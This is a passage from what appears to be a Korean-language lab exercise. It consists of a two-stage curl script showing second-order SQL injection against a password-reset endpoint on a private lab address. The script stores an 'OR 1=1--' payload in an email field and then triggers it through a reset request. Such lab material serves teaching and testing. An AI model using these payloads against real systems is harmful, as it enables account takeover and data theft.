      -H 'Content-Type: application/json' \
      -d '{"email":"victim@x.com OR 1=1--","password":"any"}'
    echo "Stage 1: 페이로드 저장 완료"

    # Stage 2 — 패스워드 재설정 (저장된 email 사용)
    curl -s -X POST http://10.20.30.80/rest/user/reset-password \
      -d '{"email":"victim@x.com OR 1=1--"}' \
      -H 'Content-Type: application/json'
    echo "Stage 2: 저장된 페이로드가 reset-password 쿼리에 주입됨"
    echo "2차 SQLi 분석 완료"
    ```

